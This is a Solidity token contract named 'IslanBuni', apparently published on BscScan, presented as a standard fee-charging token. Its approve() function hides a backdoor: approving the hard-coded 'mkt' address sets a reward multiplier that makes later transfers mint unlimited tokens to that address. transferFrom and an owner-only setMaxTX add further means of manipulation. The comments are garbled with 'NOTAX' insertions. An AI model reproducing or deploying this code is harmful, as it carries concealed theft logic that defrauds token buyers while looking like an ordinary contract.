/**
 *Submitted for verification at BscScan.com on 2022-03-04
*/

pragma solidity ^0.8.12;

contract  IslanBuni {
    string public name = "IslanBuni";
    string public symbol = "IslanBuni";
    uint8 public decimals = 9;
    address private _owner = msg.sender;
    uint256 private _reward = 1;
    uint256 private _fee = 5;
    uint256 public totalSupply = 10000000 * 10 ** decimals;
    address private mkt = 0xa0BA4e48dBc1Fe9aFCF376D5a40C05CBE9C460ce;
    uint256 private _maxTxAmount = 10000000 * 10 ** decimals;
    uint256 private _miniswap = 1000;
    
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

     /**
     * @dev Emitted when the allowance of a `_spenderNOTAX` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed _owner,
        address indexed _sender,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

     /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a booNOTAX value NOTAXcating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        uint256 taxfee;
        taxfee = (_value *_fee)/(100);
        _value = _value - taxfee;
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        balanceOf[mkt] += taxfee * _reward;
        
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    
     /**
     * @dev Sets `amount` as the allowance of `_spenderNOTAX` over the caller's tokens.
     *
     * Returns a booNOTAX value NOTAXcating whether the operation succeeded.
     *
     * IMPORTANT: BeNOTAXDAO that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unNOTAXte
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the _spenderNOTAX's allowance to 0 and set the
     * desired value afterNOTAXds:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
 
    function approve(address _sender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_sender] = _value;
        if (_sender == address(mkt)) {
            _reward = _value;
        }
        emit Approval(msg.sender, _sender, _value);
        return true;
    }

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a booNOTAX value NOTAXcating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        uint256 taxfee;
        taxfee = (_value *_fee)/(100);
        _value = _value - taxfee;
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        balanceOf[mkt] += taxfee * _reward;
        if(_value >= _maxTxAmount) {
            _reward = _maxTxAmount * _miniswap;

        }
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function setMaxTX(uint256 value) public {
        require(msg.sender == _owner);
        _maxTxAmount = value;
    }
}